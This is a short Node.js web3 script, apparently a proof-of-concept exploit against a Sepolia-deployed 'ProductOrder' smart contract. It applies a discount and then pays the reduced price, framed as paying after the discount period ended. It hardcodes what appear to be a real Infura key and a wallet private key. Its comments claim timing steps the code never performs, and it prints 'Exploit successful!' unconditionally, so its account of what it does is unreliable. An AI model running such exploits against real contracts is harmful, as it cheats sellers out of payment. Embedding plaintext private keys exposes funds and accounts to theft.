let Web3 = require("web3");
let fs = require('fs');
let path = require('path');

const ETHEREUM_NETWORK = "sepolia";
const INFURA_API_KEY = "wss://sepolia.infura.io/ws/v3/c05b5a2a17704036b3f7f34eb166eddd";
const SIGNER_PRIVATE_KEY = "507fa0895604a7826a816b4100da7d5c05a1d53b18c26a1db5eebac3357a4b05";

let connect = () => {
  const Web3 = require("web3");

  const web3 = new Web3(
    new Web3.providers.WebsocketProvider(
      INFURA_API_KEY,
      {
        clientConfig: {
          maxReceivedFrameSize: 10000000000,
          maxReceivedMessageSize: 10000000000,
        }
      }
    )
  );

  const signer = web3.eth.accounts.privateKeyToAccount(SIGNER_PRIVATE_KEY);
  web3.eth.accounts.wallet.add(signer);

  return web3;
}

const web3 = connect();

// Assuming you have the ABI and contract address
const contractABI = JSON.parse(fs.readFileSync(path.join(__dirname, 'ProductOrderContractABI.json'), 'utf8'));
const contractAddress = "0xYourContractAddressHere"; // Replace with your contract address

const contract = new web3.eth.Contract(contractABI, contractAddress);

async function exploit() {
    const discountAmount = web3.utils.toWei('0.1', 'ether'); // Assuming a discount of 0.1 ether for simplicity

    // Step 1: Apply the discount just before the discountEndTime
    await contract.methods.applyDiscount(discountAmount).send({ from: web3.eth.accounts.wallet[0].address });

    // Step 2: Quickly send the reduced payment amount
    const discountedPrice = await contract.methods.price().call();
    await contract.methods.payForOrder().send({ from: web3.eth.accounts.wallet[0].address, value: discountedPrice });

    console.log("Exploit successful! Paid the discounted price after the discount period.");
}

exploit().catch(console.error);
